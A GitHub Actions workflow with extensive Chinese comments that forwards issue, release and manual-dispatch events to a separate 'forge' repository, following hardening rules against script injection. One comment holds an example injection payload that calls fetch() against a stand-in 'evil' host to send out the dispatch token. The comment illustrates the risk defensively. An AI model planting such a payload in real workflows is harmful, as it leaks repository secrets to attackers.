name: forward-to-forge

# 本 workflow 只做一件事：把事件原样转告 forge。
# 硬规矩（细则见 market-spec/03 §2.6）：
#   1. 不 checkout —— 没有任何仓库内容进入执行环境（包括 issue 正文）
#   2. run:/script: 里零 ${{ }} 插值 —— 外部值全部走 env:（${{ }} 在那里是文本拼接，会脚本注入）
#   3. 跳过只在 job 级 —— 被跳过的 job 根本拿不到 secret。本文件现在只有一条 if:，
#      挂在 jobs.forward 上（筛 release 事件的 tag 名），写法与理由见那里。
#   4. 转发的是「信标」不是「数据」—— 只带事件名（手动按钮与发布会话下是 verb，见下）/issue 号/sha，
#      内容由 forge 自己用 API 读

on:
  issues:
    types: [opened, edited]
  # 人上传完 APK、在网页上点 "Publish release" —— 那一刻就是发车信号（2026-09-16 恢复）。
  # 在此之前搬运只能靠手动按钮（下面那个，或 forge 的 on-dispatch）：往 Release 上传 /
  # 改名 / 删 asset 都不触发任何事件（§3.3），所以传完文件不会有谁自动来搬。
  #
  # ⚠️ 它必须与 jobs.forward 上那道 if: **同进同出**：`release` 会对本仓库**任何**
  # Release 的发布触发，包括 forge 自己发的正式版本，而 forge 对不认识的事件是硬错的
  # （reconcile.go 的 default 分支）—— 摘掉闸门就变成"每发一个正式版本多一次 forge
  # 报错"。这从前正是它被删掉的原因（当时的记录：store 端 success、forge 端 failure
  # 「不认识的事件 release」）。
  #
  # ⚠️⚠️ 另一条隐藏依赖，以后动 `on:` / `if:` 时**必须**一起想：`release` 事件跑的是
  # **tag 所指提交**上的这份文件，不是默认分支 HEAD 上的；而 `_incoming` 的 tag 引用
  # 一旦建立就再也不动（实测：09-12 建的那个，09-16 的发布还在用）。所以光把触发器
  # 加在这儿、推到默认分支，队列那条路**看不见** —— 症状是 Publish 了却什么都没发生，
  # 而 Actions 页面干干净净。出路是 forge 清场时把那个引用删掉（gh.DeleteTagRef），
  # 下一次 Publish 会在**当时的**默认分支 HEAD 上重建它。
  release:
    types: [published]
  #
  # ⚠️ 这里**没有** `push` —— 别再把它加回来（2026-09-16 删的）。
  #
  # 它从前是 `push: paths: ['sources/**']`，服务于「人直接改数据源」：改一个
  # sources/{appId}.json 就只收敛那一个来源（reconcile.go 的 push 分支，OnlyID
  # 模式，不是全量）。而维护方式已经定死：收录与变更走 issue（§2.5 入口乙），
  # 产物走 _incoming（Publish 即发车）—— 人手改文件不在其中。
  #
  # 它还逼出一条**跨仓的隐式契约**：store 敢开 push，是因为 forge-core 的
  # CommitBack 每次回写都记得在提交信息里塞 `[skip-dispatch]`（internal/job/ctx.go）。
  # 真要把它加回来，得同时给 jobs.forward 那条 if: 补一个 `||` 分支；那个串至今
  # 还留在 ctx.go 里，就是给这时候用的。人手改完 sources/ 想让它生效：点一次手动
  # 按钮（verb=reconcile）。
  #
  # 手动按钮：人想主动叫一次 forge 时用（03 §3.2）—— **日常那条路已经是上面的
  # "Publish 即发车"**，所以这里主要留给两类场合：Publish 那条路没反应时的手工重试，
  # 以及人手改完 sources/ 之后让它算数（verb=reconcile）。CI 那条路（publish-apk.yml）
  # 两种都不需要，它自己发信标。
  #
  # why 按钮在本仓库而不是只在 forge：人是在**本仓库**的 Release 页面上传的文件，按钮就该
  # 在同一页的 Actions 里，省掉一次仓库切换（也省掉"我到底该去哪个仓点什么"）。forge 那边
  # 的 on-dispatch 同样通，效果一样，留着它是因为改 forge-core 的人常在那儿调试。
  #
  # why choice 而不是自由文本：choice 的取值由 GitHub 服务端**先校验**（只可能是下面 options
  # 里的字面量），到 job 里时已经是一个封闭集合的成员 —— 而它随后仍然走 env: 传下去、
  # script: 里一个字都不插值，与 issue 标题那条路同一个规矩。
  #
  # 缺省 intake-incoming 而不是 reconcile：这个按钮最可能的用途是"我刚传完文件但没自动
  # 发车"；而 reconcile 是"让 forge 把上游重新对一遍"，那件事另有每日 cron 兜着，不着急。
  workflow_dispatch:
    inputs:
      verb:
        description: 手动跑哪一件事
        type: choice
        options:
          - intake-incoming
          - reconcile
        default: intake-incoming

permissions: {}            # 不需要 GITHUB_TOKEN 的任何权限（走 PAT）

jobs:
  forward:
    runs-on: ubuntu-latest
    # 只放行"队列被发布"这一种 release（见 on: 里的说明）；其余事件照常转发。
    #
    # 短路求值是**必须**的，不是风格问题：`github.event.release` 只在 release 事件里
    # 存在，而 issue 事件上取它会让整条表达式判假 —— 症状是 run 一闪而过、结论 skipped、
    # 日志一个字都没有。所以 `github.event_name != 'release'` 必须排在最前，让非 release
    # 事件根本走不到后半句。
    #
    # ⚠️ 若要再加条件（比如把 `push:` 加回来），**同样**只能往 `||` 的右边加，别串成
    # `&&` 链 —— 同一个坑从前踩过一次，那次是 `github.event.head_commit`（它只在 push
    # 事件里存在）和一条按 author_association 的门禁串在一起；那条门禁挡不到任何人
    # （store 是私有仓库，非成员连 issue 都开不了），已删。写法长这样：
    #
    #   if: github.event_name != 'push' || !contains(github.event.head_commit.message, '[skip-dispatch]')
    if: github.event_name != 'release' || github.event.release.tag_name == '_incoming'
    steps:
      - name: Dispatch forge
        # GitHub 官方的 API 客户端 action（node24，无第三方依赖树）。选它而不是
        # 手写 curl，是为了让 payload 走 octokit 的 JSON 序列化：老写法里
        # `"ref":"%s"` 是**没有转义**的，而 git 的 refname 规则禁空格、
        # `~^:?*[\`、`..`、`@{`，**却不禁止 `"`** —— 一个叫 `v1.0"x` 的分支名
        # 就能把那串 JSON 拼坏。顺带白拿指数退避重试。
        #
        # 用主版本标签（`@v9`），不钉 commit SHA：升级交给同目录的 dependabot.yml
        # 每周开 PR。钉 SHA 更抗供应链，但每次升级都要人工查 SHA，而 SHA 写错是
        # 静默失败 —— 取舍是有意的。
        uses: actions/github-script@v9
        env:
          # ⚠️ 一切外部数据只经 env 传入；script: 里**一处 ${{ }} 都没有**。
          # script: 不是 shell，但 ${{ }} 在这里同样是**文本拼接** —— 往里面塞
          # 一个 `'); fetch('https://evil/?'+process.env.DISPATCH_TOKEN); //`
          # 效果和在 run: 里注入完全一样。这是硬规矩 2，不是 shell 专属的规矩。
          DISPATCH_TOKEN: ${{ secrets.GH_PAT }}
          # 手动按钮时 `verb` 才是主角（上面 choice 的封闭集合）；其余事件用事件名。
          # 两者落进**同一个**键，因为 forge 侧读的就是 client_payload.event。
          #
          # 发布会话要翻译一次：事件名是 `release`，而 forge 认得的是 verb，且它不认识的
          # 事件一律硬错（reconcile.go 的 default 分支）。"队列被发布"语义上就是"来搬
          # _incoming"，映射到既有的那个 verb，forge 那边一个字都不用改 —— 上面的 if:
          # 已经保证走到这里的 release 只可能是 tag 名为 `_incoming` 的那种。
          EVENT: ${{ github.event.inputs.verb || (github.event_name == 'release' && 'intake-incoming') || github.event_name }}
          ISSUE_NUMBER: ${{ github.event.issue.number }}
          REF: ${{ github.ref }}
          SHA: ${{ github.sha }}
        with:
          # 走 PAT：GITHUB_TOKEN 不能跨仓库（§6.2 不变量 1）。
          github-token: ${{ secrets.GH_PAT }}
          # 瞬时 5xx 指数退避重试。401/403/404/422 按 action 默认值**不**重试 ——
          # 那些重试也没用（token 错就是错），只会把一次失败拖成四次。
          retries: 3
          script: |
            // 与老写法里的 `echo "::add-mask::"` 等价。GitHub 本就会自动遮蔽
            // secrets.* 的值，这里显式再来一次，是为了不去依赖"自动遮蔽"这个行为。
            core.setSecret(process.env.DISPATCH_TOKEN)

            await github.rest.repos.createDispatchEvent({
              owner: 'market-of-labs',
              repo: 'forge',
              event_type: 'store-event',
              client_payload: {
                event: process.env.EVENT,
                issue: Number(process.env.ISSUE_NUMBER || 0),
                repo: `${context.repo.owner}/${context.repo.repo}`,
                ref: process.env.REF || '',
                sha: process.env.SHA || '',
              },
            })
